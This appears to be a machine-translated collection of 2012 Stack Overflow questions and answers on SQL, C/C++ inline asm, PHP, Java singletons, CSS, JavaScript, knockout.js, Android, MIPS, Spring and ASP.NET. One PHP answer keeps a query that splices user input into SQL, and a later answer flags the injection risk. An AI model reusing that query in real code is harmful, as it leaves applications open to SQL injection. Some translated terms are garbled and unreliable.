现在，考虑到当工作人员登录时，他的用户名存储在 session`Session["Username"]`中，我想从数据库中提取的所有调查都是由具有属于当前用户的专业的用户（仅限学生）上传的部。考虑到所有关系（外键）都已设置，我应该使用什么 sql 查询？或至少方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:50:33.680

**简而言之：**首先尝试找出表之间的联系（FK 和 PK - 首先，看起来专业化、员工和部门表确实有关系）。

然后提出有效的查询。尝试将其转换为视图，并根据记录数衡量性能。

尽管这是如何进行的指导方针，但我很确定这会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T03:02:12.317

请问为什么用户和员工之间没有另一张桌子？

它可能被称为 UserStaffTable，它将两个 id 列作为复合键，以及两个引用专业化和部门表的额外列？这样，您始终拥有属于工作人员的学生列表，并且您可以根据专业和/或部门过滤掉他们。

这将允许您执行联接而不是子查询。

根据this [SO answer](https://stackoverflow.com/questions/2577174/join-vs-subquery)，如果这很重要，子查询会更慢。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-14T01:31:33.327

好的，所以我在一个小时的磨削后使用子查询解决了它......谢谢大家的帮助。

```
 Select * From Survey where Username IN 
(Select Student_ID from Student where Specialization_ID IN 
(Select ID from Specialization where Department_ID = 
(Select Department_ID from Staff where Staff_ID =@Username))) 
```

# c++ - 内联 asm 是 ANSI C 标准的一部分吗？

> ID：13870489
> 
> 赞同：8
> 
> 时间：2012-12-13T23:39:36.860
> 
> 标签：c++, c, inline-assembly

我一直认为是这样，但许多 IDE 和语法高亮工具不会在 C 中高亮 ASM，但它们总是使用 C++。内联汇编是否是 C 标准（ANSII 或 ISO）的一部分？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-12-13T23:42:33.153

它不在 ISO C 标准（C2011 的 n1570 草案）中，但在附件 J（通用扩展）中提到：

> **J.5.10 asm 关键字**
> 
> 1 asm 关键字可用于将汇编语言直接插入翻译器输出 (6.8)。最常见的实现是通过以下形式的语句：
> 
> ```
> asm ( character-string-literal ); 
> ```

附录 J 是信息性的，而不是规范性的，因此实现不需要提供内联汇编，如果提供，也没有规定采用哪种形式。但它是一个广泛的扩展，虽然不是可移植的，因为编译器确实以不同的方式实现它。

在 C++ 标准（C++11 标准的 n3376 草案）中，在标准正文中提到

> **7.4 asm 声明**[dcl.asm]
> 
> 1 asm 声明的形式为
> 
> *asm 定义：*
> 
> ```
> asm ( string-literal ) ; 
> ```
> 
> asm 声明是有条件支持的；它的含义是实现定义的。[注意：通常它用于通过实现将信息传递给汇编器。——尾注]

但也不是强制性的，并且具有实现定义的解释。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-14T00:01:52.250

与流行的看法相反，`asm` *它*在 C++ 标准中，但对它的支持是有条件的。§7.4/1：

> asm 声明的形式为
> 
> *asm 定义*：
> 
> ```
> asm ( string-literal ) ; 
> ```
> 
> asm 声明是有条件支持的；它的含义是实现定义的。

也就是说，“有条件支持”意味着您根本不能依赖支持此功能的特定编译器。Microsoft（举一个明显的例子）改为使用`_asm`关键字，但语法完全不同（汇编语言用大括号括起来而不是字符串文字）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-13T23:41:25.593

否 - 内联 asm 是一种常见的扩展，但不是标准的（并且经常由不同的供应商以不同的方式实现）。

# php - 一张表的多行

> ID：13870490
> 
> 赞同：0
> 
> 时间：2012-12-13T23:39:53.287
> 
> 标签：php, sql, arrays, row, fetch

我试图从数据库中回显两件事，为什么这不起作用？以及我如何让它发挥作用。我只是在学习 php，所以如果这是一个非常愚蠢的问题，我很抱歉。

```
$result = mysql_query("SELECT user_id, team FROM users WHERE username = '$username'");
while($row = mysql_fetch_array($result))
$user_id = $row['user_id'];
$team = $row['team'];

echo = $user_id;
echo = $team;` 
```

感谢您提供的任何帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T23:41:41.217

您应该使用方括号对代码进行分组，如下所示：

```
$result = mysql_query("SELECT user_id, team FROM users WHERE username = '$username'");
while($row = mysql_fetch_array($result))
{
    $user_id = $row['user_id'];
    $team = $row['team'];

    echo $user_id;
    echo $team;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T23:48:02.570

正如 tpaksu 已经提到的，您需要在您希望循环执行的语句周围加上括号。

二、echo的正确格式是

```
echo $user_id; 
```

还有另外两个相当基本的评论

*   mysql 调用已被**弃用**，这意味着它们已被更新的替代品（特别是 mysqli 或更好的 PDO）取代。不要浪费时间学习如何使用 mysql* 系列调用，**现在**切换到 mysqli 或者最好是 PDO 。
*   像`"SELECT user_id, team FROM users WHERE username = '$username'");`在 SQL 语句中按原样包含变量的 sql 语句是[SQL 注入](http://en.wikipedia.org/wiki/SQL_injection)的巨大风险。您可能会浪费宝贵的时间设计各种巧妙的方案来在包含之前清理变量，或者您可以学习唯一正确的方法，即使用[准备好的语句](http://php.net/manual/en/pdo.prepared-statements.php)。乍一看可能不太直观，但您很快就会习惯。

这会将您的代码转换为以下内容：

```
<?php
  $stmt = $dbh->prepare("SELECT user_id, team FROM users WHERE username = ?");
  if ($stmt->execute(array($username))) {
    while ($row = $stmt->fetch()) {
      $user_id = $row['user_id'];
      $team = $row['team'];

      echo $user_id;
      echo $team;
    }
  }
?> 
```

这是注射证明和使用最新的技术。作为额外的副作用，适应其他品牌的数据库会容易得多。

# java - Java单例类中需要final关键字吗？

> ID：13870491
> 
> 赞同：16
> 
> 时间：2012-12-13T23:39:53.560
> 
> 标签：java, singleton

```
public class MySingleton{
  private static final MySingleton INSTANCE = new MySingleton();
  private MySingleton(){}
  public static getInstance(){
    return INSTANCE;
  }
} 
```

这是实现单例的正确方法吗？如果是，那么 final 关键字的必要性是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:43:57.103

Final 将确保实例在创建后不可更改。如果你只包括一个构造函数，而没有设置器，那没什么大不了的。没有人可以更改您的实例，而您没有更改它。

将其留在那里以防万一以后更改课程并不是一个坏主意。不变性提供了一些优势（更容易序列化，防止有人在背后更改您的对象等）。

恢复不变性比取出它更难。防御性地编写你的代码，这样以后就不会有人把它搞砸了。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-13T23:44:03.353

通常首选的方法是使用枚举

```
public enum MySingleton {
    INSTANCE;
} 
```

在您的示例中，最终关键字显示了意图并将防止重新分配（=错误），但并非绝对必要。

特别是，变量是静态的，它不需要是最终的就可以在多线程环境中安全地发布。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-14T00:02:17.090

在 Java 中实现单例模式没有一种正确的方法，但是使用公共静态最终实例变量是一种很好的方法，前提是您不需要延迟加载并且可以忍受单元测试的后果。

如果单元测试是一个问题并且您仍然想要一个单例，请考虑使用依赖注入。这将允许您配置具有单例生命周期的普通实例。

final 修饰符允许 Java 编译器和运行时做出良好的优化和线程安全决策。我总是将 final 与这种风格的单例声明一起使用。我什至会说允许单例实例可变是一个糟糕的设计选择——因为客户端代码不能再依赖于在进程的生命周期中看到相同的值。

可以使用可配置的工厂类来处理单元测试问题：

```
private static final MySingleton INSTANCE = MySingletonFactory.create(); 
```

...不失去最终的好处。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-13T23:43:08.110

不是真的必要。但是使用 final 它不能由单例类本身重置，这会强制执行真正的单例。但是，由于单例是不好的做法，因此可以通过添加 setInstance() 方法使它们可用于单元测试。急的人可以将setInstance定义为private，这样单元测试通过反射调用setInstance。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-03-25T09:48:30.413

似乎没有人讨论这个问题的另一个方面：**使单例实例为 final 并不会使其成为不可变**的。如果类有额外的实例变量，这些将是单例的一部分，并且可以通过通常的方式进行修改。

# html - 如何在 div/span 中垂直对齐图像？

> ID：13870497
> 
> 赞同：0
> 
> 时间：2012-12-13T23:40:31.383
> 
> 标签：html

我创建了一个 JSFiddle：http: [//jsfiddle.net/Q8uWv/](http://jsfiddle.net/Q8uWv/)

我正在尝试将图像垂直对齐在`div`. 使用`vertical-align: middle`不起作用。除此之外，我已经尝试过`margin-top:auto; margin-bottom:auto`，但仍然没有运气。我怎样才能让这个图像垂直居中？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:43:57.247

添加行高：200px；到您示例中的 div 。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T23:52:37.230

要使用`vertical-align:middle;`，您需要添加`display:table-cell;`到容器中`<div>`：

[http://jsfiddle.net/XXE2j/](http://jsfiddle.net/XXE2j/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-13T23:46:30.907

我认为这是关于垂直居中的最佳文章 [http://blog.themeforest.net/tutorials/vertical-centering-with-css/](http://blog.themeforest.net/tutorials/vertical-centering-with-css/)

# javascript - 替换克罗地亚变音符号

> ID：13870502
> 
> 赞同：2
> 
> 时间：2012-12-13T23:41:00.627
> 
> 标签：javascript, string, replace

我有脚本，人们把他们的名字和脚本根据他们真实姓名的第一个字符生成不同的名字。

```
 var firstNm = document.getElementById("Ime").value.toUpperCase(); 
```

我在 65-90(AZ) 排列的那些新名字。获取第一个字母的过程是这样的：

```
var firstNum = firstNm.charCodeAt(0) - 65;
    if (firstNum < 0 || firstNum > 25) {
        validName = false; 
```

但在此之前，当用户键入 ŠIME 时，我想将所有字符（例如“ŠIME”）更改为“SIME”，我尝试了这个，但它似乎不起作用

```
$(function() { 
  $('Ime').keyup(function() {
    $(this).val($(this).val().replace(/Š/g, "S"));
  });
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-07T19:52:59.803

[您可以在https://github.com/mplatt/fold-to-ascii-js](https://github.com/mplatt/fold-to-ascii-js)找到我的 Apache Lucene ASCII 折叠过滤器的 JavaScript 端口

它将不在前 127 个 ASCII 字符中的 Unicode 字符转换为它们的 ASCII 等效字符。

它处理您发布的字符（以及更多）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-15T19:44:34.347

抱歉各位，感谢您的帮助，我通过添加这样的功能解决了自己的问题

```
function zamjenaZnakovaI(){
var tekst = document.getElementById("Ime").value;
tekst.indexOf( 'Č' ) == 0? tekst = tekst.replace( 'Č', 'C' ) : 
tekst.indexOf( 'č' ) == 0? tekst = tekst.replace( 'č', 'c' ) : 
tekst.indexOf( 'Ć' ) == 0? tekst = tekst.replace( 'Ć', 'C' ) : 
tekst.indexOf( 'ć' ) == 0? tekst = tekst.replace( 'ć', 'c' ) : 
tekst.indexOf( 'Š' ) == 0? tekst = tekst.replace( 'Š', 'S' ) : 
tekst.indexOf( 'š' ) == 0? tekst = tekst.replace( 'š', 's' ) : 
tekst.indexOf( 'Ž' ) == 0? tekst = tekst.replace( 'Ž', 'Z' ) :
tekst.indexOf( 'ž' ) == 0? tekst = tekst.replace( 'ž', 'z' ) :
tekst.indexOf( 'Đ' ) == 0? tekst = tekst.replace( 'Đ', 'D' ) :
tekst.indexOf( 'đ' ) == 0? tekst = tekst.replace( 'đ', 'd' ) :
tekst;
document.getElementById("Ime").value = tekst;
} 
```

因为我只需要替换字符串中的第一个字母，而不是第五个或第四个

我在 keyup 上调用了函数

```
<input type="text" id="Ime" size="30"  onkeyup="zamjenaZnakovaI()"/> 
```

也许有更好的解决方案，但这一个有效。因此，如果其他人需要类似的东西，这是可以做到的一种方法。

干杯，D.

# php - 使用 knockout.js 和 php 检查输入

> ID：13870503
> 
> 赞同：1
> 
> 时间：2012-12-13T23:41:02.520
> 
> 标签：php, javascript, jquery, knockout.js

我对 knockout.js 还是很陌生，我已经掌握了基础知识，但我对如何检查输入感到困惑。我正在使用 PHP 来获取 POST 信息并使用淘汰赛来创建表单。

我有一个动态生成文本框的表单。假设我提交了表单并且其中一个值没有通过标准。表格现在被重置，一切都是空的。使用 PHP，我只需将 box = 的值设置为发布的内容，但由于淘汰赛使用以下语法，我不确定如何处理发布的值

这是我的javasctipt

```
//misc_form.js
function Form_Entry(name) {
   var self = this;
   self.name = ko.observableArray([]);
}

function EntriesViewModel() {
    var self = this;
    self.entries = ko.observableArray();

    self.add_entry = function() { 
        if(self.entries().length < 3){
        self.entries.push(new Form_Entry( ));
        }
    }
    self.remove_entry = function(name) { self.entries.remove(name) }

}
ko.applyBindings(new EntriesViewModel()); 
```

和 HTML

```
<table>
    <thead><tr>
    <th>Field Name</th><th></th>
    </tr></thead>
    <form method="post">
         <tr><td>Form Name</td><td><input type="textbox" name="form_name"/></td></tr>
         <tbody data-bind="foreach: entries">
         <tr>
         <td>Label</td><td><input data-bind="value: name"/></td>
         <td><a href="#" data-bind="click: $root.remove_entry">Remove</a></td>
        </tr>    
    </tbody>
</table>
<button data-bind="click: add_entry">Add Input Textbox</button>

    <br>
    <br>

    <input type="hidden" name="entries" data-bind="value: ko.toJSON(entries)" />
    <button type="submit">Submit Form</button>
    </form> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T00:06:00.377

通过发布表单`$.ajax`并传回任何未验证的值（可能是 JSON），然后只需将绑定到文本框的 observables 的值设置为从验证传回的值以向用户显示。

有很多方法可以做到这一点，大致如下：

JS：

```
//in view model
var self = this;
this.textBox1 = ko.observable();
//...

//validate
$.ajax({
  url: 'validateForm.php',
  success: function(data) {
    if (data.success === false) {
         //set value of textbox back to old value
         self.textBox1(data.textBox1);
         //and so on...
    }
  }
}); 
```

HTML：

```
<input data-bind="value: textBox1" /> 
```

PHP：

```
//validate...
//....
$returnData = array('success' => FALSE, 'textBox1' => $textBox1Val);
echo json_encode($returnData); 
```

* * *

更新：根据您更新的代码，我创建了一个 jsFiddle，其中包含对您的代码的更新。Knockout 期望正确的标记能够正常工作（您的`<table>`和`<form>`嵌套的），并且我添加了有关如何使提交按钮调用 JS 函数的示例代码。

你可以在这里看到代码：http: [//jsfiddle.net/3sduY/1/](http://jsfiddle.net/3sduY/1/)

# android - 为小部件动态更新图层列表中的 Drawable

> ID：13870508
> 
> 赞同：0
> 
> 时间：2012-12-13T23:41:38.817
> 
> 标签：android, android-widget, drawable, layer-list

在小部件的配置阶段，我想更新作为图层列表一部分的位图。由于 RemoteViews 和 Widgets 的所有限制，我发现自己无法实现这一点。既没有手动创建新的 LayerDrawable，也没有检索和更新 drawable。你有想法吗？

背景：小部件显示照片以及其他一些信息。即使是方形、横向或纵向的，照片也应该有良好的框架和比例。

## 图层列表：

```
<?xml version="1.0" encoding="utf-8"?>
<layer-list xmlns:android="http://schemas.android.com/apk/res/android" >
    <item android:drawable="@drawable/photo_01"></item>
    <item android:drawable="@drawable/photo_border"></item>
</layer-list> 
```

可绘制的@drawable/photo_border 是一个 9-patch 位图。

## 布局中的相应部分：

```
<!-- ... -->
<RelativeLayout
    android:layout_width="match_parent"
    android:layout_height="0dp"
    android:layout_weight="1"
    android:padding="20dp" >

    <ImageView
        android:id="@+id/photo"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_centerHorizontal="true"
        android:layout_centerVertical="true"
        android:adjustViewBounds="true"
        android:padding="4dp"
        android:scaleType="fitCenter"
        android:src="@drawable/framed_placeholder" />

</RelativeLayout>
<!-- ... --> 
```

感谢您分享您的想法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T11:53:04.020

While sleeping the problem over, I found, that I could probably just render the Bitmap manually and update the imageView. Here's the code. It's not nice, but get's the job done.

This probably can still be improved with better handling of density, etc.

```
Bitmap bmp = BitmapFactory.decodeFile(sdCard.getAbsolutePath() + pathName);
Bitmap cBitmap = Bitmap.createBitmap(bmp.getWidth(), bmp.getHeight(), Config.ARGB_8888);
Canvas c = new Canvas(cBitmap);
c.drawBitmap(bmp, 0, 0, null);
NinePatchDrawable photo_border = (NinePatchDrawable) context.getResources().getDrawable(R.drawable.photo_border);
photo_border.setBounds(0, 0, bmp.getWidth(), bmp.getHeight());
photo_border.draw(c);

views.setImageViewBitmap(id.photo, cBitmap); 
```

One thing to be aware of: When the phone boots, the widgets may receive an Update event, when the sd card is not mounted. You should either wait until it is, or skip the configuration and add an intent-filter (that's what I did)

```
<intent-filter>
    <action android:name="android.intent.action.MEDIA_MOUNTED"/>
    <data android:scheme="file"></data>
</intent-filter> 
```

# assembly - 在 MIPS 中“长时间调用”函数是什么意思

> ID：13870511
> 
> 赞同：3
> 
> 时间：2012-12-13T23:41:43.247
> 
> 标签：assembly, mips

我正在编写一个程序，该程序使用中断处理在 MIPS 中玩基于 ascii 的游戏。我被告知要从我的处理程序“长时间调用”我的主要功能。我的处理程序发生在 .ktext 0x80000180 下，如下所示：

```
.ktext  0x80000180

    move    $k1, $at

    beq $13, 0, keyboard
    li  $v0, 10 # Do nothing and exit
    syscall

    keyboard: # else check interupt level
    la  $t9, 0xffff0000
    beq $t9, 1, continue

    li  $v0, 10     # Do nothing and exit
    syscall
    continue:

    jal frogger     # call frogger function
    mtc0    $0, $13     # set cause register to 0

    mfc0    $k0, $12        # Fix status register
    andi    $k0, 0xfffd # clear EXL bit
    ori $k0, 0x1        # Enable interrupts
    mtc0    $k0, $12        # Store value back into status register

    move    $at, $k1

    eret 
```

问题出在该行上`jal frogger`，它显示 Error in F:\Users\Matt\WSU\Cpts 260\HW9\HW9.asm 第 32 行：跳转目标字地址超出 26 位范围。

其余代码是否有问题，或者是否有特殊方法可以从 .ktext 调用函数？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T23:59:30.153

长调用使用目标的完整（32 位）地址。这与您的`jal`调用不同，后者只能在指令中编码 26 位地址，并且可能是 PC 相关的（我不记得是否是这种情况）。要进行长调用，您将构造地址或将地址加载到寄存器，然后跳转到该地址。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-14T23:33:29.837

替换`jal frogger`为：

```
 la    $t9, frogger
  jalr  $t9 
```

`JALR`在 MIPS 中使用绝对地址。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-10-24T19:45:04.763

我遇到过同样的问题。我发现我的功能正在该`.data`部分中定义。一旦我把它放在该`.text`部分下，它运行得非常好。

另外，我是 MIPS 的新手，所以不知道`.ktext`是什么。抱歉，我帮不上忙。

# css - 响应式设计：如何仅使用 CSS 隐藏小视口的图标标签？

> ID：13870513
> 
> 赞同：0
> 
> 时间：2012-12-13T23:41:46.297
> 
> 标签：css, responsive-design, media-queries

我正在使用[ZURB Foundation](http://foundation.zurb.com/)框架进行响应式布局。

我在导航栏上的文本旁边添加了一些图标（图标字体跨度），这就是我想要发生的事情：

当视口不够宽以在一行上显示所有导航项时，应隐藏*仅将级联到下一行的项*的文本标签，并且该项的字体大小（图标大小）应增加到一个新的固定值。

我附上了 3 张图片（我刚刚被 chrome 检查员欺骗）来展示我在寻找什么。

如果没有 JavaScript，这可能吗？如果是这样，怎么做？

![全屏](../Images/ecd1601aa046654d92d4640c3d51a6e6.png)

![开窗的](../Images/d550a0b045e5a93019477a613f0d1764.png)

![移动的](../Images/f923b65023647dfe199efe50a898e552.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T00:02:52.720

所以...

这是 W3C 建议的[隐藏部分链接文本](http://www.w3.org/TR/WCAG20-TECHS/C7)的解决方案：

```
height: 1px;
width: 1px;
position: absolute;
overflow: hidden;
top: -10px; 
```

假设您要使用以下 HTML 代码：

```
<li><a href="#">Documentation</a></li> 
```

如果您想要（例如）30px => 50px 转换，这是一个解决方案：

```
li {
  padding-left : 30px;
  line-height  : 30px; /* vertical align */
  background   : transparent url(http://placehold.it/30) no-repeat scroll 0 0;
}

/* Put whatever you want as a size here */
@media (max-width: 600px) { 
  li {

    background : transparent url(http://placehold.it/50) no-repeat scroll 0 0;
    width      : 50px;
    height     : 50px;
  }
  a {
    height   : 1px;
    width    : 1px;
    position : absolute;
    overflow : hidden;
    top      : -1000px; 
  }
} 
```

此解决方案强制您为图像创建 2 个版本。但实际上不建议调整图像大小，因此处理一张图像的 2 个版本并不是一个坏主意。

在您的特定情况下，如果您使用字体图标，您可能会使用这种 HTML 代码：

```
<li>
  <a href="#">
    <span class="icon">X</span>
    <span class="text">Documentation</span>
  </a>
</li> 
```

所以你可以这样调整 CSS 代码：

```
span {
  font-size : medium;
}

@media (max-width: 600px) { 
  span.icon {
    font-size : x-large;
  }
  span.text {
    height   : 1px;
    width    : 1px;
    position : absolute;
    overflow : hidden;
    top      : -1000px; 
  }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T23:46:27.577

试试这样的东西？

CSS：

```
@media (max-width: 320px) 
.noshow {
display: none;
} 
```

在您的 HTML 标记中，将“noshow”类应用于您要隐藏的文本。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-14T03:00:02.393

我通过迭代[Charles-Edouard Coste](https://stackoverflow.com/users/1844857/charles-edouard-coste)的答案找到了解决方案。我正在使用[Sass](http://sass-lang.com/)，但我将首先显示它的 CSS 输出：

```
nav .nav-bar .icon {
  font-size: 24px;
  padding-right: 4px;
}

@media only screen and (max-width: 700px) {
  nav .nav-bar li:nth-child(1) .icon-label {
    display: none;
  }
}
@media only screen and (max-width: 800px) {
  nav .nav-bar li:nth-child(2) .icon-label {
    display: none;
  }
}
@media only screen and (max-width: 900px) {
  nav .nav-bar li:nth-child(3) .icon-label {
    display: none;
  }
}
@media only screen and (max-width: 1000px) {
  nav .nav-bar li:nth-child(4) .icon-label {
    display: none;
  }
}
@media only screen and (max-width: 1100px) {
  nav .nav-bar li:nth-child(5) .icon-label {
    display: none;
  }
} 
```

该解决方案可以在每减少一百像素时隐藏一个标签。不幸的是，它要求列表中的每个元素都有一个新规则，因此它要求样式表要么

1.  准确了解列表长度，或
2.  包括可能未使用的指令，直到合理的最大长度。

我选择创建一个[Sass mixin](http://sass-lang.com/docs/yardoc/file.SASS_REFERENCE.html#mixins)以供重用并使源代码不那么冗长。

```
@mixin iconlist( $min-width, $label-selector, $step: 100px, $count: 5 )
  //
   The iconlist() mixin will responsively hide labels, 
   starting from the last, as the viewport width is decreased.

   This can be included in a horizontal list to show only icons
   on small screens, while still displaying as many labels as
   possible, assuming items are prioritized from most important
   to least.

  @for $i from 1 through $count
    $max-width: $min-width + ( $step * $i )
    @media only screen and (max-width: #{$max-width})
      li:nth-child(#{$i})
        #{$label-selector}
          display: none 
```

**用法**

```
.nav-bar
  // Responsively hide 0-3 labels from the end of the list.
  @include iconlist(600px, '.icon-label', 100px, 3) 
```

如果有人愿意建议一个重构来产生更小或更好解耦的 CSS，那就太棒了！但我不确定它会如何完成。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-12-13T23:46:09.340

根据您的喜好和需要进行编辑。

```
@media only screen and (max-device-width: 480px) { 

  html {
    -webkit-text-size-adjust: none;
  }

  .tooBig {
    display: none;
  }

} 
```

# spring - 如何读取使用配置的所有属性键

> ID：13870515
> 
> 赞同：0
> 
> 时间：2012-12-13T23:42:08.567
> 
> 标签：spring

我想知道是否可以读取从属性文件中读取的所有密钥，而无需读取属性文件本身。我有这样配置的占位符

```
<context:property-placeholder
    system-properties-mode="OVERRIDE"
    ignore-resource-not-found="true"
    location="classpath:/defaults.properties, file:${config.location:/etc/default/example.properties}" /> 
```

这几乎可以解决我需要的所有案例。现在我想要一个配置概览页面，我可以在其中验证是否所有设置都已正确配置，而无需手动`@Value`将所有值注入其中`@Controller`并使用`ModelAndView`.

有什么想法可以解决这个问题，或者是否可以使用属性占位符？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T11:55:44.843

`PropertyPlaceHolderConfigure`不要公开他的属性，但您可以从 BeanDefinition 获取位置并以相同的结果加载它们。

```
BeanDefinition bd = configurableApplicationContext.getBeanFactory().getBeanDefinition("org.springframework.beans.factory.config.PropertyPlaceholderConfigurer#0");
    String[] locations = (String[]) bd.getPropertyValues().getPropertyValue("locations").getValue();
    Properties props = new Properties();
    for (String loc : locations) {
        props.putAll(PropertiesLoaderUtils.loadProperties(configurableApplicationContext.getResource(loc)));
    } 
```

# asp.net - 在 HiddenField asp.net 中存储字符串数组

> ID：13870516
> 
> 赞同：18
> 
> 时间：2012-12-13T23:42:12.130
> 
> 标签：asp.net, hidden-field

我需要使用 asp.net 在我的网络表单中的 HiddenField 中存储一个字符串数组。谁能告诉我如何实现这一目标？谢谢

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-13T23:48:36.543

可能有几种方法会起作用。

**1) 序列化 JSON 中的 String[]**

这在 .NET 中使用`JavaScriptSerializer`该类相当容易，并且避免了分隔符问题。就像是：

```
String[] myValues = new String[] { "Red", "Blue", "Green" };
string json = new JavaScriptSerializer().Serialize(myValues); 
```

**2）想出一个永远不会出现在字符串中的分隔符**

`|||`用永远不会出现在字符串中的字符分隔每个字符串。您可以使用`String.Join()`来构建此字符串。就像是：

```
String[] myValues = new String[] { "Red", "Blue", "Green" };
string str = String.Join("|||", myValues); 
```

然后像这样重建它：

```
myValues = str.Split(new string[] { "|||" }, StringSplitOptions.RemoveEmptyEntries); 
```

如果您可以信任您的输入，例如一系列预定义的选项，这可能是最佳选择。否则，如果您想非常安全，您可能需要*检查*输入字符串以确保它们不包含此分隔符。您可能会`HttpUtility.HtmlEncode()`先使用转义每个字符串。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-12-13T23:48:48.797

**存储数组**

```
string[] myarray = new string[] {"1","2"};

myHiddenField.Value = String.Join(",", myarray); 
```

**获取数组**

```
string[] myarray = myHiddenField.Value.Split(','); 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2015-11-25T16:03:28.420

你真的想把它存储在一个字段中吗？

如果您将每个值放在它自己的隐藏字段中，并为所有隐藏字段提供您的属性名称，那么模型绑定会将其视为一个数组。

```
foreach (var option in Model.LookOptions)
{
    @Html.Hidden(Html.NameFor(model => model.LookOptions).ToString(), option)
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-03-14T23:56:38.330

### 现有答案

我总是宁愿使用默认属性和模型绑定器，而不是必须将数组包装成 CSV 并且不必担心在每次往返客户端时将其拆分并加入它（如[@Mike Christensen](https://stackoverflow.com/a/13870590/1366033)和[@编码业务](https://stackoverflow.com/a/13870594/1366033)）。这正是模型绑定器的用途。

[@David 的回答](https://stackoverflow.com/a/33921110/1366033)为我们指明了正确的方向，但我宁愿不要将这种类型的逻辑内联到您的视图中，而是将其降级为 EditorTemplate。

### 首选解决方案

所以你可以添加以下视图`~/Views/Shared/EditorTemplates/HiddenArray.cshtml`

```
@model Array

@foreach (var value in Model)
{
    <input type="hidden" value="@value"
           name="@Html.NameFor(model => model)"
           id="@(Html.IdFor(model => model))_@value" />
} 
```

然后从你的模型中这样调用：

```
@Html.EditorFor(model => model.FavoriteAnimals, "HiddenArray") 
```

### 替代策略

以下是我如何手动为每个隐藏输入指定名称和 id 变量：

[![为数组隐藏](../Images/027bcee9c4d7a6fe094ba92617ae3059.png)](https://i.stack.imgur.com/45XOu.png)

*   **A)** Can't use [`HiddenFor()`](https://msdn.microsoft.com/en-us/library/Microsoft.Web.Mvc.Html.HtmlHelperExtensions.HiddenFor "Microsoft.Web.Mvc.Html.HtmlHelperExtensions.HiddenFor") inside a loop because it thinks the property name now includes the value
*   **B)** When we call EditorFor, the current model is added to the Route Prefix so if we pass the current model name as a string to to [`Hidden()`](https://msdn.microsoft.com/en-us/library/Microsoft.Web.Mvc.Html.HtmlHelperExtensions.Hidden "Microsoft.Web.Mvc.Html.HtmlHelperExtensions.Hidden") we'll actually double up and the property name won't be able to bind on the way back.
*   **C)** It feels odd, but we can just pass an empty string as the name and rely on the Route Prefix to do its job, but because we're inside a loop, the ID that gets produced isn't valid HTML
*   **D)** By grabbing the name and ID from the model and incrementing the dummy ID, we can continue to output valid HTML, even though it's probably not likely to affect anything but html linters and audits

### Further Reading:

*   [**Phil Haack** - 模型绑定到列表](https://haacked.com/archive/2008/10/23/model-binding-to-a-list.aspx/)
*   [**Scott Hanselman** - 用于模型绑定到数组、列表、集合、字典的 ASP.NET 有线格式](https://www.hanselman.com/blog/ASPNETWireFormatForModelBindingToArraysListsCollectionsDictionaries.aspx)

# vb.net - 复制结构数据

> ID：13870529
> 
> 赞同：0
> 
> 时间：2012-12-13T23:43:20.290
> 
> 标签：vb.net

我在 Option Strict 开启时出现从二进制文件读取结构数据的功能有问题。

> ```
> Public Function arh_setup(ByVal rw As Boolean) As Integer
>     Dim retval As Integer = 0
>     Dim fnum As Integer = FreeFile()
>     Dim temp As ValueType = CType(New aSetup, ValueType) 
> ```

```
 Try
        FileOpen(fnum, setup_file, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Shared, Len(asT))
        If rw Then
            FilePut(fnum, asT, 1)
        Else
            FileGet(fnum, temp, 1)
        End If
        FileClose(fnum)
    Catch ex As Exception
        retval = -1
    End Try

' Now is question here
' How to get data from temp to asT?? 
EDIT:
Solution is asT = CType(temp, aSetup)

    temp= Nothing        
    Return retval
End Function 
```

asT 是全局声明的 aSetup （结构）类型的变量，它应该从包含（正确）读取数据的 temp 中获取数据。

问题是如何将数据从局部临时变量复制到全局 asT 变量，最好不循环（逐字节）或在不可能的情况下循环？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:46:45.830

尝试铸造：

```
asT = CType(temp, aSetup) 
```

`Nothing`另外，在退出方法之前不要设置局部变量，这完全没有意义。并且您应该使用.NET 的`FileStream`s 等而不是VB6 兼容方法来读取文件。

# algorithm - 给定数字集合的所有可能的操作组合，总和为给定数字

> ID：13870532
> 
> 赞同：0
> 
> 时间：2012-12-13T23:43:35.793
> 
> 标签：algorithm, search, combinations, algebra

